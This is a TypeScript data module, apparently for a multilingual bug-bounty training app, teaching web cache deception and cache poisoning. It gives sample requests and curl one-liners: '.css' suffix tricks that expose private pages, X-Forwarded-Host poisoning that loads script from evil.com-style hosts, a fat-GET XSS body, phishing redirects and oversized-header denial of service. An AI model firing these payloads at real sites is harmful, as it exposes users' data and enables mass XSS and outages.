import type { Lang } from "./types";

export interface CacheScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface CacheTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "cache_deception" | "unkeyed_headers" | "fat_get_cloaking" | "path_delimiters" | "dos_poisoning";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: CacheScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface CachePhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface CacheToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface CacheReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP WEB CACHE DECEPTION & CACHE POISONING TECHNIQUES ─────────────────
export const CACHE_TECHNIQUES: CacheTechnique[] = [
  {
    id: "web-cache-deception-path-confusion",
    title: {
      en: "Web Cache Deception (WCD) via Static Extension Appending",
      simple: "Adding '.css' to Private Account Pages to Steal Victim Profiles via CDN Cache",
      hi: "वेब कैश डिसेप्शन (WCD) - '.css' जोड़कर CDN कैश से विक्टिम का प्राइवेट डेटा चुराना",
    },
    category: "cache_deception",
    difficulty: "beginner",
    successRate: "Very High on Cloudflare, Akamai, and CloudFront setups with default caching rules",
    summary: {
      en: "Web Cache Deception occurs when a caching proxy (CDN) and the origin server parse the URL differently. Caching proxies typically cache files based on static file extensions (.css, .js, .png, .svg). When an attacker crafts a link like `https://target.com/account/settings/test.css` and tricks an authenticated victim into opening it, the origin server ignores `/test.css` and serves the victim's private profile HTML. The CDN, seeing the `.css` extension, caches this private response globally. The attacker then requests `https://target.com/account/settings/test.css` and reads the victim's PII, credit card details, and CSRF tokens!",
      simple: "A website's settings page has your private data. If an attacker sends you a link ending with '.css' (like /settings/test.css), the server still shows your profile, but the CDN thinks it's a harmless style file and saves a copy for everyone. The attacker can then view your private account data!",
      hi: "जब किसी प्राइवेट पेज के URL के पीछे `.css` या `.js` लगा दिया जाए, तो बैकएंड वेब सर्वर उसे सामान्य प्रोफाइल पेज समझकर आपका प्राइवेट डेटा भेजता है, लेकिन CDN उसे स्टेटिक स्टाइलशीट समझकर इंटरनेट पर सबके लिए सेव (Cache) कर लेता है। अटैकर वही लिंक खोलकर आपका गुप्त डेटा पढ़ लेता है!",
    },
    scenarios: [
      {
        title: {
          en: "Profile Data & CSRF Token Theft via /api/v1/user/profile.css",
          simple: "Stealing User API Keys and Personal Details via Appended .css",
          hi: "प्राइवेट प्रोफाइल URL में '.css' लगाकर यूज़र API टोकन चुराना",
        },
        description: {
          en: "Target endpoint `https://target.com/my-account` returns user email, phone number, and account balance. Accessing `https://target.com/my-account/style.css` returns the exact same HTML body. Because Cloudflare has standard caching rules for `.css` assets, Cloudflare edge stores the victim's session response with `CF-Cache-Status: HIT`.",
          simple: "Visiting /my-account/style.css displays your account. The CDN saves it. Anyone who opens that exact link afterwards gets your account info.",
          hi: "विक्टिम जब `/my-account/style.css` खोलता है, तो CDN उस पेज को सेव कर लेता है। इसके बाद अटैकर उसी लिंक से विक्टिम का डेटा देख सकता है।",
        },
        commandOrRequest: `# Victim clicks attacker link while logged in:
GET /my-account/profile.css HTTP/1.1
Host: target.com
Cookie: session_token=victim_auth_12345
User-Agent: Mozilla/5.0

# Server response cached by CDN:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
CF-Cache-Status: HIT
Cache-Control: public, max-age=14400

<html><body><h1>Welcome John Doe</h1><p>API Key: sec_9812481</p></body></html>`,
        responseSample: `HTTP/1.1 200 OK
Date: Fri, 23 Oct 2026 09:10:00 GMT
Content-Type: text/html; charset=utf-8
CF-Cache-Status: HIT
Age: 45
Cache-Control: public, max-age=14400

<html><body><h1>Welcome John Doe</h1><p>Email: john@target.com</p><p>API Key: sec_9812481</p></body></html>`,
        impact: {
          en: "Critical (P1): Account Takeover and massive PII data leakage with zero user interaction beyond clicking a single link.",
          simple: "Steals sensitive user data and account tokens with just one click.",
          hi: "सिर्फ एक लिंक क्लिक से विक्टिम का पूरा निजी डेटा और अकाउंट क्रेडेंशियल लीक हो जाता है।",
        },
      },
      {
        title: {
          en: "Spring Framework & Tomcat Matrix Parameter Semicolon Suffix (;.js)",
          simple: "Using Semicolons (;) to Bypass Framework Routing and Force Caching",
          hi: "टॉमकैट व स्प्रिंग में सेमीकोलन (;) लगाकर कैश डिसेप्शन",
        },
        description: {
          en: "Java Spring Boot and Tomcat strip everything after a semicolon as matrix variables: `/api/user/info;random=1.js`. The backend processes `/api/user/info`. However, Akamai and Fastly inspect the full URI string, see `.js`, and cache the private response in edge memory.",
          simple: "Java web servers ignore anything written after a semicolon, but caching firewalls still read the .js extension and save the private answer.",
          hi: "जावा सर्वर सेमीकोलन के बाद का टेक्स्ट हटाकर प्रोफाइल खोल देता है, जबकि CDN `.js` देखकर उसे कैश कर लेता है।",
        },
        commandOrRequest: `GET /api/v2/wallet/balance;matrix.js HTTP/1.1
Host: target.com
Cookie: auth=victim_session_jwt`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json
X-Cache: HIT from cloudfront
Age: 120

{"user_id": 9921, "balance_usd": 48200.00, "crypto_wallet": "0x71C...a49"}`,
        impact: {
          en: "Exposure of high-value financial balances, cryptocurrency wallet addresses, and private KYC records.",
          simple: "Leaks financial balances and crypto wallets.",
          hi: "बैंक बैलेंस और क्रिप्टो वॉलेट की निजी जानकारी सार्वजनिक हो जाती है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify endpoints containing sensitive user data (e.g. `/profile`, `/account`, `/api/me`, `/billing`).",
        simple: "Find pages that display your private account information.",
        hi: "ऐसे पेजों की पहचान करें जहाँ आपका निजी डेटा या बिलिंग जानकारी दिखती हो।",
      },
      {
        en: "Append harmless static file extensions to the URL: `/profile/test.css`, `/profile/logo.png`, `/profile;.js`, `/profile/%23.css`.",
        simple: "Add '.css', '.js', or ';.js' to the end of the URL and hit enter.",
        hi: "URL के अंत में `.css`, `.js`, या `;test.js` जोड़कर देखें।",
      },
      {
        en: "Inspect response headers: look for caching indicators such as `CF-Cache-Status: HIT`, `X-Cache: Hit from cloudfront`, or an increasing `Age` header.",
        simple: "Check the response headers to see if the word 'HIT' appears in the cache headers.",
        hi: "रिस्पॉन्स हेडर में देखें कि क्या `CF-Cache-Status: HIT` या `Age` बढ़ रहा है।",
      },
      {
        en: "Open the exact same URL in an Incognito / Private window without logging in: if the victim's profile appears, Web Cache Deception is confirmed!",
        simple: "Open that link in Incognito. If you see your logged-in info while logged out, you found a bounty!",
        hi: "उसी लिंक को प्राइवेट/इनकॉग्निटो विंडो में खोलें। अगर बिना लॉगिन के भी डेटा दिख रहा है, तो बग पक्का है!",
      },
    ],
    burpOrToolRule: [
      "Burp Suite Extension: Web Cache Deception Scanner (PortSwigger BApp Store)",
      "Curl test oneliner: curl -sI 'https://target.com/profile/test.css' | grep -iE 'cache|age'",
      "Param Miner: Guess delimiters and static extensions",
    ],
    hunterProTip: {
      en: "Always test non-standard delimiters! If `/profile/test.css` returns 404, test `/profile%00.css` (null byte), `/profile%23.css` (URL encoded #), `/profile%3f.css` (URL encoded ?), and `/profile;test.js`. Delimiter discrepancy is where 80% of modern WCD bounties hide!",
      simple: "If adding /test.css gives 404, try adding ;.js or %23.css instead. Servers get confused by different symbols!",
      hi: "अगर `/test.css` 404 दे, तो `;test.js` या `%23.css` (एन्कोडेड #) लगाकर देखें। 80% आधुनिक कैश बग्स इन्हीं अलग-अलग सिंबल्स से मिलते हैं!",
    },
  },
  {
    id: "unkeyed-header-cache-poisoning",
    title: {
      en: "Web Cache Poisoning via Unkeyed Headers (X-Forwarded-Host / X-Original-URL)",
      simple: "Poisoning CDN Cache with Malicious JavaScript to Attack All Website Visitors",
      hi: "अनकीड हेडर कैश पॉइज़निंग (X-Forwarded-Host से पूरी वेबसाइट पर XSS फैलाना)",
    },
    category: "unkeyed_headers",
    difficulty: "intermediate",
    successRate: "High on high-traffic homepages and static documentation portals",
    summary: {
      en: "Web Cache Poisoning occurs when an attacker manipulates an HTTP request using 'unkeyed' inputs (headers or parameters not included in the CDN's cache key, such as `X-Forwarded-Host`, `X-Host`, or `X-Rewrite-URL`). If the backend server reflects this header into the HTML response (e.g. `<script src=\"https://<X-Forwarded-Host>/analytics.js\">`), the CDN caches this poisoned response. When innocent users globally visit the legitimate page, the CDN serves the cached payload, executing Stored XSS or redirecting millions of users to an attacker-controlled site!",
      simple: "A website uses a CDN to serve its homepage fast. The CDN caches the page based on the web address, but ignores secret headers like 'X-Forwarded-Host'. If you put your malicious domain in this header and the website uses it to load its scripts, the CDN saves your malicious script for everyone who visits the homepage!",
      hi: "जब CDN किसी पेज को सेव करता है, तो वह केवल मुख्य URL देखता है, लेकिन `X-Forwarded-Host` जैसे गुप्त हेडर्स को नज़रअंदाज़ कर देता है। अगर वेबसाइट का बैकएंड उस हेडर से जावास्क्रिप्ट फाइल लोड कर रहा हो, तो CDN उस ज़हरीले रिस्पॉन्स को सेव कर लेता है और हर विजिटर के ब्राउज़र में अटैकर का XSS कोड रन हो जाता है!",
    },
    scenarios: [
      {
        title: {
          en: "Global Stored XSS via Reflected X-Forwarded-Host in Script Tag",
          simple: "Injecting Malicious Script URL into the Homepage Cache",
          hi: "होमपेज के कैश में अटैकर का स्क्रिप्ट लिंक डालकर ग्लोबल XSS",
        },
        description: {
          en: "The target homepage `https://target.com/` loads a telemetry script using dynamic host reflection: `<script src=\"https://\" + request.getHeader('X-Forwarded-Host') + \"/tracker.js\"></script>`. Sending a request with `X-Forwarded-Host: evil-attacker.com` causes the poisoned response to be cached for 24 hours. Every subsequent visitor executes the attacker's script.",
          simple: "The homepage asks the server where to get its tracking code. By sending a fake host header, the server loads the script from your server and saves it in the cache for everyone.",
          hi: "वेबसाइट अपने ट्रैकिंग कोड के लिए सर्वर से लिंक लेती है। फेक होस्ट हेडर भेजकर हम उस लिंक को अपनी साइट पर मोड़ देते हैं और यह कैश में सेव हो जाता है।",
        },
        commandOrRequest: `GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.net
User-Agent: Mozilla/5.0`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html
CF-Cache-Status: HIT
Age: 10
Cache-Control: public, max-age=86400

<html>
<head>
  <script src="https://exploit-server.net/tracker.js"></script>
</head>
<body><h1>Target Corporation</h1></body>
</html>`,
        impact: {
          en: "Critical (P1): Zero-click persistent Stored XSS affecting 100% of homepage visitors, mass session hijacking, and defacement.",
          simple: "Complete takeover of all website visitors with zero clicks required.",
          hi: "होमपेज पर आने वाले 100% यूज़र्स के अकाउंट्स की चोरी और ग्लोबल वेबसाइट डिफेसमेंट।",
        },
      },
      {
        title: {
          en: "X-Original-URL Path Overwrite Causing Stored 302 Open Redirect",
          simple: "Poisoning the Cache to Redirect All Visitors to a Phishing Site",
          hi: "कैश को दूषित करके सभी विजिटर्स को फिशिंग साइट पर रीडायरेक्ट करना",
        },
        description: {
          en: "Sending `X-Original-URL: /login` or `X-Rewrite-URL: https://phishing-target.com` causes the origin framework to trigger a 302 Redirect. When cached by the edge proxy under `GET /`, any user requesting the homepage gets redirected to the phishing portal.",
          simple: "Make the server reply with a redirect, cache that reply on the homepage, and every visitor gets instantly bounced to a fake login page.",
          hi: "होमपेज के कैश में 302 रीडायरेक्ट भर देना, जिससे वेबसाइट खोलने वाला हर व्यक्ति सीधे फर्जी लॉगिन पेज पर पहुंच जाता है।",
        },
        commandOrRequest: `GET / HTTP/1.1
Host: target.com
X-Original-URL: /external-redirect?url=https://phishing.com`,
        responseSample: `HTTP/1.1 302 Found
Location: https://phishing.com
CF-Cache-Status: HIT
Cache-Control: public, max-age=3600`,
        impact: {
          en: "High/Critical: Unauthenticated global traffic hijacking and mass credential phishing.",
          simple: "Mass phishing attack redirecting all traffic to an attacker's clone.",
          hi: "पूरी वेबसाइट के ट्रैफिक को हाईजैक करके फर्जी पेज पर भेजना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Always use a unique cache-buster parameter (e.g. `/?cachebuster=abc12345`) during testing so you NEVER poison the live cache for real users!",
        simple: "Always add a random test word like ?test12345 to your URL so you don't break the real site for innocent people!",
        hi: "हमेशा टेस्ट करते समय `?cb=test12345` जैसा रैंडम पैरामीटर लगाएं ताकि असली यूज़र्स के लिए साइट खराब न हो!",
      },
      {
        en: "Use Burp Suite Param Miner -> 'Guess headers' on the target homepage.",
        simple: "Run Param Miner in Burp to automatically find unkeyed headers.",
        hi: "Burp के Param Miner एक्सटेंशन से अनकीड हेडर्स को स्कैन करें।",
      },
      {
        en: "Inject canary headers: `X-Forwarded-Host: canary-token.com`, `X-Host: canary.com`, `X-Forwarded-Proto: http`.",
        simple: "Send test headers with a unique word to see if it shows up in the webpage HTML.",
        hi: "टेस्ट हेडर्स भेजकर देखें कि क्या रिस्पॉन्स के HTML में आपका शब्द दिखाई देता है।",
      },
      {
        en: "Check if the response reflects your canary and verifies `X-Cache: HIT` on subsequent requests from a different browser.",
        simple: "Send a second request from a different window to confirm the poisoned page is saved in cache.",
        hi: "दूसरी विंडो से वही URL खोलकर पुष्टि करें कि रिस्पॉन्स में `HIT` आ रहा है।",
      },
    ],
    burpOrToolRule: [
      "Burp Extension: Param Miner (PortSwigger) -> Right click -> Guess headers",
      "Common unkeyed headers: X-Forwarded-Host, X-Host, X-Original-URL, X-Rewrite-URL, X-Forwarded-Scheme",
      "Test command: curl -I -H 'X-Forwarded-Host: evil.com' 'https://target.com/?cb=unique123'",
    ],
    hunterProTip: {
      en: "Check `X-Forwarded-Scheme: http`! On many setups, sending `X-Forwarded-Scheme: http` causes the web server to think the user is on insecure HTTP, returning a `301 Moved Permanently` to HTTPS. Caching this 301 under the HTTPS URL creates an infinite redirect loop (DoS) that takes the entire homepage offline!",
      simple: "Sending X-Forwarded-Scheme: http often creates an infinite redirect loop that crashes the website!",
      hi: "`X-Forwarded-Scheme: http` हेडर भेजने पर सर्वर अक्सर 301 रीडायरेक्ट भेजता है। इसे कैश करवा देने पर पूरी वेबसाइट क्रैश (इनफिनिट रीडायरेक्ट लूप) हो जाती है!",
    },
  },
  {
    id: "fat-get-parameter-cloaking",
    title: {
      en: "Fat GET Requests & Parameter Cloaking Poisoning",
      simple: "Sending a Hidden Request Body on a GET Request to Sneak Past Cache Keys",
      hi: "फैट GET रिक्वेस्ट और पैरामीटर क्लोकिंग से कैश बाईपास",
    },
    category: "fat_get_cloaking",
    difficulty: "advanced",
    successRate: "High on Ruby on Rails, Node.js, and Akamai/Varnish caches",
    summary: {
      en: "By RFC standard, HTTP GET requests do not include a message body. CDNs exclude request bodies entirely when computing the cache key for GET requests. However, modern backend frameworks (Ruby on Rails, Express.js, Spring) happily parse JSON or form-encoded bodies sent with GET requests ('Fat GET'). If the backend prioritizes parameters from the body over query parameters (`body.param || query.param`), an attacker can send an exploit in the GET body that poisons the cache for users requesting the innocent URL without a body!",
      simple: "Normally, GET requests don't have a body. The CDN computes the cache key only using the link. But backend servers DO read the hidden body! You can hide your attack in the body of a GET request, and the CDN saves the poisoned result for everyone who clicks the normal link!",
      hi: "CDN केवल URL देखकर कैश करता है और GET रिक्वेस्ट की बॉडी को नज़रअंदाज़ कर देता है। लेकिन बैकएंड फ्रेमवर्क GET रिक्वेस्ट के अंदर की बॉडी को भी पढ़ लेता है। अटैकर बॉडी में पेलोड भेजकर पूरे पेज के कैश को दूषित कर सकता है!",
    },
    scenarios: [
      {
        title: {
          en: "Fat GET Parameter Overwrite on Search API Endpoints",
          simple: "Overwriting the Search Query from the Body to Store XSS in Cache",
          hi: "सर्च एंडपॉइंट पर GET बॉडी से XSS इंजेक्ट करके कैश दूषित करना",
        },
        description: {
          en: "A search page `GET /search?q=shoes` reflects the query into `<input value=\"shoes\">`. By sending `GET /search?q=shoes` with an HTTP body `q=\"><script>alert(1)</script>`, the CDN generates the cache key based solely on `/search?q=shoes`. The backend Rails server uses the body parameter to generate the HTML. The cached response contains the executed XSS for all regular users searching for 'shoes'!",
          simple: "Send a search request with normal text in the link, but your attack code in the body. The CDN caches your attack for that popular search word!",
          hi: "URL में सामान्य शब्द और बॉडी में XSS कोड भेजें। CDN उस लोकप्रिय सर्च पेज पर आपका XSS कोड सभी यूज़र्स के लिए सेव कर लेगा!",
        },
        commandOrRequest: `GET /search?q=trending HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

q="><script src="//evil.com/xss.js">`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html
CF-Cache-Status: HIT
Cache-Control: public, max-age=7200

<h1>Search Results for "><script src="//evil.com/xss.js"></h1>`,
        impact: {
          en: "Critical (P1): Mass exploitation of high-traffic search terms, leading to credential theft and session hijacking.",
          simple: "Attacks thousands of users who search for popular keywords.",
          hi: "हजारों यूज़र्स जब भी वह शब्द सर्च करेंगे, उनके अकाउंट्स तुरंत हैक हो जाएंगे।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify a GET request that reflects query parameters into the response HTML (e.g. `/search?q=test`, `/filter?cat=news`).",
        simple: "Find a link that reflects your search word on the page.",
        hi: "ऐसा लिंक खोजें जहाँ आपके द्वारा सर्च किया गया शब्द स्क्रीन पर दिखता हो।",
      },
      {
        en: "In Burp Repeater, switch the request method to GET and add a `Content-Type: application/x-www-form-urlencoded` header.",
        simple: "In Burp Repeater, add a message body to your GET request.",
        hi: "Burp Repeater में GET रिक्वेस्ट में बॉडी और Content-Type हेडर जोड़ें।",
      },
      {
        en: "Add a body with the same parameter name: `q=<canary>`. Check if the backend reflects the body parameter over the URL parameter.",
        simple: "Put a different test word in the body to see if the page prints the body word instead of the link word.",
        hi: "बॉडी में नया शब्द डालकर देखें कि क्या पेज URL वाले शब्द के बजाय बॉडी वाला शब्द दिखा रहा है।",
      },
      {
        en: "If the body overrides the query, poison the cache with an XSS canary and verify cache HIT from an external browser.",
        simple: "If the body wins, you can poison the cache for that entire page!",
        hi: "अगर बॉडी का शब्द दिख जाए, तो इसका मतलब है कि आप पूरे पेज का कैश पॉइज़न कर सकते हैं!",
      },
    ],
    burpOrToolRule: [
      "Burp Repeater: Add HTTP body to standard GET request",
      "Param Miner: 'Fat GET' scan option in advanced settings",
    ],
    hunterProTip: {
      en: "Also test Semicolon Parameter Cloaking! In Akamai and Varnish, query parameters are separated by `&`, but some backends split parameters on `;` (e.g. `/profile?utm_source=fb;cb=123`). This allows cloaking malicious parameters inside unkeyed analytics parameters!",
      simple: "Try separating parameters with a semicolon (;) instead of an ampersand (&) to confuse caching servers.",
      hi: "पैरामीटर्स के बीच `&` की जगह `;` लगाकर देखें। बहुत से कैशिंग सर्वर सेमीकोलन को अलग तरह से पढ़ते हैं!",
    },
  },
  {
    id: "dos-cache-poisoning-headers",
    title: {
      en: "Denial of Service (DoS) Cache Poisoning via Oversized Headers & Schemes",
      simple: "Taking Entire Webpages Offline Globally by Caching HTTP 400 Bad Request Errors",
      hi: "DoS कैश पॉइज़निंग - पूरे होमपेज को 400 एरर से हमेशा के लिए बंद कर देना",
    },
    category: "dos_poisoning",
    difficulty: "intermediate",
    successRate: "High on Apache, Nginx, and Node.js reverse proxies",
    summary: {
      en: "Many web servers enforce a strict header size limit (e.g. Apache defaults to 8KB `LimitRequestFieldSize`, Node.js defaults to 8KB/16KB). CDNs often support much larger headers (up to 32KB). When an attacker sends a request to the homepage with a 10KB unkeyed header, the CDN passes it to the origin, which returns `HTTP 400 Bad Request: Request Header Or Cookie Too Large`. If the CDN caches 400 responses, the entire homepage is replaced with a 400 error for all legitimate visitors globally!",
      simple: "Servers crash with a 400 Bad Request error if you send a really long fake header (like 10,000 letters). If the CDN accidentally saves this 400 error, everyone in the world who visits the homepage gets a broken page, knocking the website completely offline!",
      hi: "अगर हम 10KB लंबा फालतू हेडर भेजें, तो बैकएंड सर्वर 400 Bad Request एरर देता है। यदि CDN इस 400 एरर को सेव (Cache) कर ले, तो दुनिया का कोई भी इंसान उस वेबसाइट को नहीं खोल पाएगा और पूरी साइट डाउन हो जाएगी!",
    },
    scenarios: [
      {
        title: {
          en: "Global Homepage Blackout via Cached 400 Bad Request Error",
          simple: "Caching a 400 Error on the Main Website to Shut It Down",
          hi: "मुख्य वेबसाइट पर 400 एरर कैश करवाकर पूरी साइट डाउन करना",
        },
        description: {
          en: "Sending `GET /` with header `X-Oversized-Header: [9,000 bytes of 'A']` causes the origin Apache server to respond with `HTTP 400 Bad Request`. Fastly / Cloudflare caches this 400 response because `Cache-Control: public` is inherited. The target's homepage becomes completely unavailable to all users worldwide.",
          simple: "Send a huge header to the homepage. The server gives a 400 error. The CDN saves it, breaking the homepage for all users globally.",
          hi: "होमपेज पर 9,000 अक्षरों का हेडर भेजकर 400 एरर लाएं। CDN उसे सेव कर लेगा और होमपेज सभी के लिए बंद हो जाएगा।",
        },
        commandOrRequest: `GET /?cache_test=9921 HTTP/1.1
Host: target.com
X-Oversized-Padding: ${"A".repeat(8500)}
User-Agent: Mozilla/5.0`,
        responseSample: `HTTP/1.1 400 Bad Request
Content-Type: text/html
CF-Cache-Status: HIT
Age: 30
Cache-Control: public, max-age=3600

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>400 Bad Request</title></head>
<body><h1>Bad Request</h1><p>Your browser sent a request that this server could not understand.<br />Size of a request header field exceeds server limit.</p></body></html>`,
        impact: {
          en: "High / Critical: Application-level Denial of Service (DoS) taking production domains offline without volumetric bandwidth consumption.",
          simple: "Takes the entire company website offline with a single request.",
          hi: "बिना किसी बड़े DDoS अटैक के सिर्फ 1 रिक्वेस्ट से पूरी वेबसाइट को डाउन कर देना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Always test on an isolated query parameter (`/?dos_test=unique_hash_123`) to avoid taking real infrastructure down!",
        simple: "Always use a unique test parameter like ?dos_test=123 so you don't take down the real site!",
        hi: "हमेशा `?dos_test=123` लगाकर ही टेस्ट करें ताकि असली वेबसाइट बंद न हो जाए!",
      },
      {
        en: "Send a request with an unkeyed dummy header of 4KB, 8KB, 12KB, and 16KB length.",
        simple: "Send a request with a long test header of 8,000 letters.",
        hi: "8,000 से 12,000 अक्षरों का लंबा हेडर भेजकर देखें।",
      },
      {
        en: "Observe if the status changes to 400 Bad Request or 431 Request Header Fields Too Large.",
        simple: "See if you get a 400 or 431 error message.",
        hi: "जांचें कि क्या 400 Bad Request या 431 एरर रिस्पॉन्स मिला।",
      },
      {
        en: "Send a second request without the long header using the same cache-buster: if the 400 error persists with `CF-Cache-Status: HIT`, DoS Cache Poisoning is confirmed!",
        simple: "Send a clean request without the long header. If the error still shows up with 'HIT', the bug is verified!",
        hi: "बिना हेडर के दोबारा वही लिंक खोलें। अगर अब भी 400 एरर और `HIT` दिख रहा है, तो DoS कैश बग कन्फर्म है!",
      },
    ],
    burpOrToolRule: [
      "Burp Intruder: Fuzz header length from 1,000 to 16,000 characters",
      "Check Cloudflare Cache Settings: Caching 4xx errors is often enabled by default on custom page rules",
    ],
    hunterProTip: {
      en: "Bug bounty programs take DoS Cache Poisoning very seriously when demonstrated on an isolated cache-buster! Always include a video PoC showing you test only on `?dos_poc=123` to prove impact safely without violating rules of engagement.",
      simple: "Bug bounty programs pay high bounties for this! Just make sure to test on a safe unique URL and never hurt real users.",
      hi: "कंपनियां इस बग पर बहुत बड़ा इनाम देती हैं! बस ध्यान रखें कि टेस्ट केवल `?test=123` पर ही करें ताकि असली यूज़र्स प्रभावित न हों।",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY FOR CACHE ATTACKS ─────────────────────────────────
export const CACHE_METHODOLOGY_PHASES: CachePhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Cache Architecture & Key Fingerprinting",
      simple: "Phase 1: Detecting Which CDN is Used and How It Saves Pages",
      hi: "चरण 1: कैश आर्किटेक्चर और कैश-की की पहचान",
    },
    objective: {
      en: "Identify the caching layer (Cloudflare, Akamai, CloudFront, Fastly, Varnish) and determine how cache keys and headers behave.",
      simple: "Find out if the site uses Cloudflare, CloudFront, or Fastly, and see what response headers appear.",
      hi: "पता करें कि वेबसाइट कौन सा CDN इस्तेमाल कर रही है और उसके रिस्पॉन्स हेडर कैसे काम करते हैं।",
    },
    steps: [
      {
        en: "Send a baseline request to the homepage and inspect headers: `CF-Cache-Status`, `X-Cache`, `Age`, `X-Timer`, `Server`.",
        simple: "Inspect headers in Burp to look for CF-Cache-Status or X-Cache.",
        hi: "होमपेज पर रिक्वेस्ट भेजकर `CF-Cache-Status` और `X-Cache` हेडर्स देखें।",
      },
      {
        en: "Send two identical requests: verify if the second request returns `HIT` and an incremented `Age` value.",
        simple: "Send the request twice to confirm pages are being cached.",
        hi: "दो बार रिक्वेस्ट भेजकर पुष्टि करें कि दूसरी बार `HIT` और `Age` आ रहा है या नहीं।",
      },
      {
        en: "Test query string handling: check if `/page?cb=1` and `/page?cb=2` return independent cache entries.",
        simple: "Check if adding ?cb=1 gives a fresh response every time.",
        hi: "जांचें कि क्या `?cb=1` लगाने से हमेशा नया कैश बनता है।",
      },
    ],
    commandsOrPayloads: [
      `curl -I https://target.com/ | grep -iE 'cache|age|cf-|x-amz-cf'`,
      `curl -I https://target.com/?cb=12345`,
    ],
    keyTargets: [
      "Cache Status headers (CF-Cache-Status, X-Cache)",
      "Age header progression",
      "Cache-Control directives (public, max-age, s-maxage)",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Web Cache Deception (WCD) Suffix Probing",
      simple: "Phase 2: Testing Account Pages with Static Extensions",
      hi: "चरण 2: वेब कैश डिसेप्शन (WCD) एक्सटेंशन टेस्टिंग",
    },
    objective: {
      en: "Test authenticated and sensitive endpoints for path confusion and static extension caching discrepancies.",
      simple: "Add .css, .js, or ;.js to your profile page to see if the CDN caches your private details.",
      hi: "प्रोफाइल और सेटिंग्स URL में `.css` या `;test.js` लगाकर देखें कि क्या प्राइवेट डेटा कैश हो रहा है।",
    },
    steps: [
      {
        en: "Log into an account and locate endpoints returning private user PII or API tokens.",
        simple: "Find your account settings page with your email and address.",
        hi: "अपने अकाउंट में जाकर वह पेज ढूंढें जहाँ आपकी ईमेल और पर्सनल डेटा दिखता हो।",
      },
      {
        en: "Append extensions: `/profile.css`, `/profile/test.js`, `/profile;.css`, `/profile%23.css`.",
        simple: "Add .css or ;.js to the link and send it.",
        hi: "URL के अंत में `.css` या `;test.js` जोड़ें।",
      },
      {
        en: "Verify in a second incognito session: if the private response is served to unauthenticated users with a `HIT`, report P1!",
        simple: "Open that link in Incognito. If you see the profile without logging in, you found a critical bug!",
        hi: "प्राइवेट विंडो में वही लिंक खोलें। अगर बिना लॉगिन के प्रोफाइल दिख जाए, तो P1 रिपोर्ट तैयार करें!",
      },
    ],
    commandsOrPayloads: [
      `curl -sI -H 'Cookie: auth=token' https://target.com/api/me/style.css`,
      `curl -sI https://target.com/api/me/style.css`,
    ],
    keyTargets: [
      "Private API routes (/api/v1/user, /api/me)",
      "Account settings and billing pages",
      "Matrix URI delimiters (; and %23)",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Unkeyed Header Fuzzing with Param Miner",
      simple: "Phase 3: Finding Secret Headers that Change the Page Content",
      hi: "चरण 3: अनकीड हेडर्स की खोज (Param Miner का उपयोग)",
    },
    objective: {
      en: "Discover HTTP headers that alter the response body or trigger redirects without being part of the CDN cache key.",
      simple: "Find hidden headers like X-Forwarded-Host that change the website's HTML without breaking the cache.",
      hi: "ऐसे हेडर्स की खोज करें जो पेज का डेटा बदल देते हैं लेकिन कैश की में शामिल नहीं होते।",
    },
    steps: [
      {
        en: "Attach Param Miner to the request in Burp Suite and select 'Guess headers'.",
        simple: "Run Param Miner in Burp Suite to search for headers.",
        hi: "Burp में Param Miner चलाकर अनकीड हेडर्स की जांच करें।",
      },
      {
        en: "Manually probe high-frequency headers: `X-Forwarded-Host`, `X-Host`, `X-Original-URL`, `X-Forwarded-Proto`.",
        simple: "Test common headers like X-Forwarded-Host with your test domain.",
        hi: "मुख्य हेडर्स जैसे `X-Forwarded-Host` को टेस्ट करें।",
      },
      {
        en: "Observe if values reflect into `<script src=...>`, `<link href=...>`, or `Location:` headers.",
        simple: "See if your test domain shows up inside the webpage code or redirects.",
        hi: "देखें कि क्या आपका डोमेन HTML कोड में या रीडायरेक्ट में दिख रहा है।",
      },
    ],
    commandsOrPayloads: [
      `curl -I -H "X-Forwarded-Host: canary.burpcollaborator.net" "https://target.com/?cb=p3test"`,
      `curl -I -H "X-Original-URL: /admin" "https://target.com/?cb=p3test"`,
    ],
    keyTargets: [
      "X-Forwarded-Host & X-Host",
      "X-Forwarded-Proto & X-Forwarded-Scheme",
      "X-Original-URL & X-Rewrite-URL",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Fat GET & Parameter Cloaking Testing",
      simple: "Phase 4: Hiding Payloads Inside GET Request Bodies",
      hi: "चरण 4: फैट GET और सेमीकोलन पैरामीटर क्लोकिंग की जांच",
    },
    objective: {
      en: "Identify endpoints where the backend processes request bodies or parses semicolons on GET requests while the CDN ignores them.",
      simple: "Put an attack inside a GET request body to see if the backend runs it while the CDN caches it.",
